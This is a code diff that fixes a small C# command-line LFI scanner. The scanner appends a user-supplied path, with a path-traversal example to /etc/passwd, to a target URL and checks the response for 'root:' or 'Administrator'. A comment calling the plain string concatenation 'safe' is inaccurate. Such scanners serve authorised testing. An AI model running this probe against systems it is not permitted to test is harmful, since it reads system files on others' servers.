@@ -1,45 +1,44 @@
-﻿using System;
+﻿
+using System;
 using System.Net;
 
-namespace LFIScanner 
-
+namespace LFIScanner
 {
-    class Programm 
+    class Program
     {
         static void Main(string[] args)
         {
-            System.Console.WriteLine("[+]Enter target url>> ");
+            Console.WriteLine("[+]Enter target url>> ");
             string url = Console.ReadLine();
 
-            System.Console.WriteLine("[+]Enter a payload>> ");
-            string payload = Console.ReadLine();
+            Console.WriteLine("[+]Enter a file path (e.g., ../../../../../etc/passwd)>> ");
+            string filePath = Console.ReadLine();
 
-        try
-        {
-            string response = FetchContent(url + payload);
-            if(response.Contains("root:"))
+            try
             {
-                System.Console.WriteLine($"LFI vulnerability found at {url + payload}");
-            } 
-            else 
+                string response = FetchContent(url, filePath);
+                if (response.Contains("root:") || response.Contains("Administrator")) // Adjust detection logic as needed
+                {
+                    Console.WriteLine($"LFI vulnerability found at {url + filePath}");
+                }
+                else
+                {
+                    Console.WriteLine($"No LFI vulnerability found at {url + filePath}");
+                }
+            }
+            catch (Exception ex)
             {
-                System.Console.WriteLine($"No LFI vulnerability found at {url + payload}");
+                Console.WriteLine($"An error occurred: {ex.Message}");
             }
         }
-        catch(WebException ex)
-        {
-            System.Console.WriteLine(ex.Message);
-        }
 
-        static string FetchContent(string uri)
+        static string FetchContent(string url, string filePath)
         {
-            using(WebClient client = new WebClient())
+            string fullUrl = url + filePath; // Combine URL and file path safely
+            using (WebClient client = new WebClient())
             {
-                return client.DownloadString(uri);
+                return client.DownloadString(fullUrl);
             }
         }
-        }
-
-        
     }
 }
